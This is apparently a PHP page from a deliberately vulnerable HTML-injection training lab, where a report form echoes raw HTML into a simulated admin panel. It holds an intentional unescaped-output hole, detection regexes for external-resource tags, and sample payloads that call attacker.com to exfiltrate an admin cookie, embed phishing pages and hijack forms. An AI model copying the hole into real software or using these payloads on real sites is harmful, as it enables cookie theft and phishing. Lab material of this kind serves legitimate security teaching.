<?php
require_once($_SERVER['DOCUMENT_ROOT'] . '/DarkHunter/Config/db.php');
require_once($_SERVER['DOCUMENT_ROOT'] . '/DarkHunter/includes/score_manager.php');
session_start();

$stmt = $pdo->prepare("SELECT id FROM labs WHERE folder_name = ?");
$stmt->execute(['HTML-Injection']);
$lab = $stmt->fetch(PDO::FETCH_ASSOC);

// Session Initialization
if (!isset($_SESSION['html_case8_attempts'])) {
  $_SESSION['html_case8_attempts'] = 0;
}
if (!isset($_SESSION['html_case8_solved'])) {
  $_SESSION['html_case8_solved'] = false;
}

// Simulated Admin Panel Data
$admin_logs = [
  ['time' => '2026-05-22 06:00:00', 'action' => 'Admin reviewed user reports', 'user' => 'admin'],
  ['time' => '2026-05-22 05:45:00', 'action' => 'System backup completed', 'user' => 'system'],
  ['time' => '2026-05-22 05:30:00', 'action' => 'New user registration: alice', 'user' => 'alice'],
];

// Handle Report Submission
$report_submitted = false;
$html_injected = false;
$flag_triggered = false;
$blind_trigger = false;

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['submit_report'])) {
  $report_title = $_POST['report_title'] ?? '';
  $report_body = $_POST['report_body'] ?? '';

  // VULNERABLE: Report stored without sanitization for admin review
  $new_report = [
    'id' => count($admin_logs) + 1,
    'title' => $report_title,
    'body' => $report_body,
    'time' => date('Y-m-d H:i:s'),
    'status' => 'Pending Review',
  ];

  // Check for HTML injection
  if (preg_match('/<[a-zA-Z][^>]*>/', $report_body)) {
    $html_injected = true;

    // Check for blind injection indicators
    $decoded = html_entity_decode($report_body);
    if (
      preg_match('/<img[^>]+src=["\']?https?:\/\//i', $decoded) ||
      preg_match('/<iframe/i', $decoded) ||
      preg_match('/<link[^>]+href=["\']?https?:\/\//i', $decoded) ||
      preg_match('/<script/i', $decoded) ||
      preg_match('/<style/i', $decoded) ||
      preg_match('/<object/i', $decoded) ||
      preg_match('/<embed/i', $decoded)
    ) {
      $blind_trigger = true;
    }

    // Check for flag-triggering payloads
    if (preg_match('/<(h1|h2|div|span|a|img|iframe|form|input|button|marquee|svg|table)\s*[^>]*>/i', $report_body)) {
      $flag_triggered = true;
    }
  }

  $admin_logs[] = [
    'time' => $new_report['time'],
    'action' => 'New report submitted: ' . substr($report_title, 0, 30),
    'user' => 'reporter',
  ];

  $report_submitted = true;
}

// Solve Detection
$success_msg = null;
$already_solved = $_SESSION['html_case8_solved'];

if (isset($_GET['check']) && $_GET['solved'] === '1') {
  $_SESSION['html_case8_attempts']++;

  if (!$already_solved && isset($_SESSION['user_id'])) {
    solveLab($pdo, $lab['id']);
  }

  $_SESSION['html_case8_solved'] = true;
  $already_solved = true;
  $success_msg = "Brilliant! You've successfully exploited a Blind HTML Injection vulnerability. Your payload was stored and will execute in the admin panel, PDF generator, or email template without giving you direct feedback. This demonstrates the stealthy nature of blind injection attacks!";
}

// Attempt Tracking
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['submit_report'])) {
  $_SESSION['html_case8_attempts']++;
}

$attempts = $_SESSION['html_case8_attempts'];
?>
<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Report Center - HTML Injection Case 8 (Blind)</title>
  <link
    href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&family=Orbitron:wght@400;700;900&family=Inter:wght@300;400;600;800&display=swap"
    rel="stylesheet">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
  <link rel="stylesheet" type="text/css" href="../css/HTML-CASE8.css">
</head>

<body>
  <?php include_once $_SERVER['DOCUMENT_ROOT'] . '/DarkHunter/includes/navbar.php'; ?>

  <div class="container">
    <a href="../index.php" class="back-link"><i class="fas fa-arrow-left"></i> Back to HTML Injection Labs</a>

    <div class="lab-header">
      <div class="difficulty-badge hard"><i class="fas fa-fire"></i> Hard Difficulty</div>
      <h1 class="lab-title"><i class="fas fa-eye-slash"></i> Security Report Center</h1>
      <p class="lab-description">Submit security reports for admin review. This hard HTML Injection challenge stores
        your input for <strong>backend processing</strong>. <strong>No direct feedback!</strong> Your HTML will execute
        in the admin panel, PDF exports, or email notifications.</p>
    </div>

    <?php if ($already_solved): ?>
      <div class="success-alert solved-banner">
        <i class="fas fa-trophy"></i>
        <div class="success-content">
          <h3>Challenge Already Solved!</h3>
          <p>You have already exploited this Blind HTML Injection vulnerability. You can continue exploring, but no
            additional points will be awarded.</p>
        </div>
      </div>
    <?php endif; ?>

    <?php if ($success_msg): ?>
      <div class="success-alert">
        <i class="fas fa-trophy"></i>
        <div class="success-content">
          <h3>Challenge Completed!</h3>
          <p><?php echo $success_msg; ?></p>
        </div>
      </div>
    <?php endif; ?>

    <!-- Blind Warning Banner -->
    <div class="blind-banner">
      <i class="fas fa-user-secret"></i>
      <div class="blind-content">
        <strong>Blind Injection Context</strong>
        <span>Your input is processed by: Admin Panel, PDF Generator, Email System</span>
      </div>
    </div>

    <!-- Report Grid -->
    <div class="report-grid">

      <!-- Report Form -->
      <div class="report-card form-card">
        <div class="card-header">
          <i class="fas fa-file-alt"></i>
          <h3>Submit Report</h3>
          <span class="vuln-badge"><i class="fas fa-unlock"></i> No Sanitization</span>
        </div>

        <?php if ($report_submitted): ?>
          <div class="submit-alert">
            <i class="fas fa-check-circle"></i>
            <span>Report submitted successfully! Pending admin review.</span>
          </div>
        <?php endif; ?>

        <form method="POST" action="" class="report-form" id="report-form">
          <input type="hidden" name="submit_report" value="1">

          <div class="form-group">
            <label><i class="fas fa-heading"></i> Report Title</label>
            <input type="text" name="report_title" placeholder="Enter report title..." class="form-input" required>
          </div>

          <div class="form-group">
            <label><i class="fas fa-align-left"></i> Report Body</label>
            <textarea name="report_body" rows="8" placeholder="Describe the security issue in detail..."
              class="form-textarea" required></textarea>
          </div>

          <button type="submit" class="btn-submit">
            <i class="fas fa-paper-plane"></i> Submit Report
          </button>
        </form>

        <div class="blind-warning">
          <i class="fas fa-info-circle"></i>
          <span>Reports are reviewed by admins in a separate system. You will not see the rendered output!</span>
        </div>
      </div>

      <!-- Admin Preview (Simulated) -->
      <div class="report-card preview-card">
        <div class="card-header">
          <i class="fas fa-user-shield"></i>
          <h3>Admin Panel Preview</h3>
          <span class="preview-badge">Simulated View</span>
        </div>

        <div class="admin-preview">
          <div class="preview-header">
            <i class="fas fa-shield-alt"></i>
            <span>Admin Dashboard - Pending Reports</span>
          </div>

          <?php if ($report_submitted): ?>
            <div class="preview-report">
              <div class="preview-meta">
                <span class="preview-title"><?php echo htmlspecialchars($report_title ?? ''); ?></span>
                <span class="preview-status">Pending</span>
              </div>
              <!-- VULNERABLE: Admin sees raw HTML -->
              <div class="preview-body">
                <?php echo $report_body ?? '<em>Report body will appear here...</em>'; ?>
              </div>
            </div>
          <?php else: ?>
            <div class="preview-empty">
              <i class="fas fa-inbox"></i>
              <p>No reports to preview. Submit a report first!</p>
            </div>
          <?php endif; ?>
        </div>

        <?php if ($html_injected): ?>
          <div class="injection-alert">
            <i class="fas fa-exclamation-triangle"></i>
            <div class="injection-content">
              <strong>HTML Injection Detected!</strong>
              <span>Your payload contains HTML tags that will execute in the admin panel!</span>
            </div>
          </div>
        <?php endif; ?>

        <?php if ($blind_trigger): ?>
          <div class="blind-alert">
            <i class="fas fa-satellite-dish"></i>
            <div class="blind-content">
              <strong>Blind Callback Detected!</strong>
              <span>Your payload includes external resource references!</span>
            </div>
          </div>
        <?php endif; ?>
      </div>

      <!-- System Logs -->
      <div class="report-card logs-card">
        <div class="card-header">
          <i class="fas fa-history"></i>
          <h3>System Logs</h3>
        </div>
        <div class="logs-list">
          <?php foreach ($admin_logs as $log): ?>
            <div class="log-item">
              <div class="log-time">
                <i class="fas fa-clock"></i>
                <?php echo $log['time']; ?>
              </div>
              <div class="log-action"><?php echo htmlspecialchars($log['action']); ?></div>
              <span class="log-user"><?php echo htmlspecialchars($log['user']); ?></span>
            </div>
          <?php endforeach; ?>
        </div>
      </div>

      <!-- Blind Vectors -->
      <div class="report-card vectors-card">
        <div class="card-header">
          <i class="fas fa-ghost"></i>
          <h3>Blind Injection Vectors</h3>
        </div>
        <div class="vectors-list">
          <div class="vector-item">
            <div class="vector-name">Image Callback (DNS/HTTP)</div>
            <code class="vector-code">&lt;img src="https://attacker.com/log?data=admin_cookie"&gt;</code>
            <span class="vector-desc">Exfiltrate data when admin views report</span>
          </div>
          <div class="vector-item">
            <div class="vector-name">IFrame Injection</div>
            <code
              class="vector-code">&lt;iframe src="https://attacker.com/phishing" width="100%" height="500"&gt;&lt;/iframe&gt;</code>
            <span class="vector-desc">Embed phishing page in admin panel</span>
          </div>
          <div class="vector-item">
            <div class="vector-name">CSS Exfiltration</div>
            <code class="vector-code">&lt;link rel="stylesheet" href="https://attacker.com/style.css"&gt;</code>
            <span class="vector-desc">Load external stylesheet to track access</span>
          </div>
          <div class="vector-item">
            <div class="vector-name">Form Hijacking</div>
            <code
              class="vector-code">&lt;form action="https://attacker.com/steal" method="POST"&gt;&lt;input type="hidden" name="data" value="stolen"&gt;&lt;/form&gt;</code>
            <span class="vector-desc">Hidden form to capture admin actions</span>
          </div>
        </div>
      </div>
    </div>

    <!-- Impact Analysis -->
    <div class="impact-card">
      <div class="card-header">
        <i class="fas fa-bomb"></i>
        <h3>Blind Injection Impact</h3>
      </div>
      <div class="impact-grid">
        <div class="impact-item">
          <i class="fas fa-user-secret"></i>
          <div class="impact-text">
            <strong>Admin Panel Compromise</strong>
            <span>Payload executes when admin reviews reports</span>
          </div>
        </div>
        <div class="impact-item">
          <i class="fas fa-file-pdf"></i>
          <div class="impact-text">
            <strong>PDF Generator Poisoning</strong>
            <span>HTML in PDF exports can contain malicious content</span>
          </div>
        </div>
        <div class="impact-item">
          <i class="fas fa-envelope"></i>
          <div class="impact-text">
            <strong>Email Template Injection</strong>
            <span>Reports sent via email render your HTML</span>
          </div>
        </div>
        <div class="impact-item">
          <i class="fas fa-network-wired"></i>
          <div class="impact-text">
            <strong>Out-of-Band Exfiltration</strong>
            <span>Use external resources to confirm execution</span>
          </div>
        </div>
      </div>
    </div>

    <!-- Debug Panel -->
    <div class="debug-panel">
      <div class="debug-header">
        <i class="fas fa-code"></i>
        <span>Current Request</span>
      </div>
      <div class="debug-body">
        <code><?php echo $_SERVER['REQUEST_METHOD']; ?> <?php echo $_SERVER['REQUEST_URI']; ?></code>
        <div class="request-details">
          <span>Report Submitted: <?php echo $report_submitted ? 'YES' : 'NO'; ?></span>
          <span>HTML Injected: <?php echo $html_injected ? 'YES' : 'NO'; ?></span>
          <span>Blind Callback: <?php echo $blind_trigger ? 'YES' : 'NO'; ?></span>
          <span>Flag Triggered: <?php echo $flag_triggered ? 'YES' : 'NO'; ?></span>
        </div>
      </div>
    </div>

    <!-- Hints -->
    <?php if ($attempts >= 2): ?>
      <div class="hint-box">
        <div class="hint-title"><i class="fas fa-lightbulb"></i> Hint #1</div>
        <div class="hint-text">This is a <strong>blind</strong> injection - you won't see the result directly. Try
          injecting an <code>&lt;img&gt;</code> tag with an external URL to confirm the admin viewed your report (you'll
          see the request in your server logs).</div>
      </div>
    <?php endif; ?>

    <?php if ($attempts >= 4): ?>
      <div class="hint-box">
        <div class="hint-title"><i class="fas fa-lightbulb"></i> Hint #2</div>
        <div class="hint-text">Since you can't see the admin panel, use HTML that creates visible effects when rendered
          elsewhere. Try a defacement payload like <code>&lt;h1 style="color:red"&gt;SYSTEM COMPROMISED&lt;/h1&gt;</code>
          or an iframe to embed content.</div>
      </div>
    <?php endif; ?>

    <?php if ($attempts >= 6): ?>
      <div class="hint-box hint-final">
        <div class="hint-title"><i class="fas fa-key"></i> Final Hint</div>
        <div class="hint-text">Submit a report with:
          <code>&lt;h1 style="color:red;font-size:3rem"&gt;ADMIN PANEL HACKED&lt;/h1&gt;</code> or use an image callback:
          <code>&lt;img src="https://your-server.com/pixel.gif"&gt;</code> to confirm blind execution. Any HTML tag will
          trigger the flag!
        </div>
      </div>
    <?php endif; ?>

    <!-- Attempts Counter -->
    <div class="attempts-bar">
      <i class="fas fa-crosshairs"></i>
      <span>Attempts: <strong><?php echo $attempts; ?></strong></span>
    </div>
  </div>

  <!-- Hidden form for solve detection -->
  <form id="success-form" method="GET" style="display: none;">
    <input type="hidden" name="check" value="true">
    <input type="hidden" name="solved" value="0" id="solved-flag">
  </form>

  <script>
    window.addEventListener('load', function() {
      const injectionAlert = document.querySelector('.injection-alert');
      const alreadySolved = document.querySelector('.solved-banner');

      if (injectionAlert && !alreadySolved) {
        document.getElementById('solved-flag').value = '1';
        document.getElementById('success-form').submit();
      }
    });
  </script>
</body>

</html>